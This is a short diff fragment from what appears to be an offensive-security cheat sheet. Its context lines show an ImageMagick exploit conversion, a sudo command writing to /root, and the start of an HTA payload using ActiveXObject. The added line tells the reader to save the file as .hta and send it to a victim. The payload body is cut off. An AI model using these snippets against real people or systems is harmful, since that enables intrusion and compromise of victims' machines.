@@ -526,6 +526,7 @@ convert exploit.mvg exploit.png
 sudo 2to3-2.7 -w -n light.py --output=/root/script
 
 [hta payload]
+#Save as something.hta and send to victim
 ```
 <script %00 >
     lets=ActiveXObject;
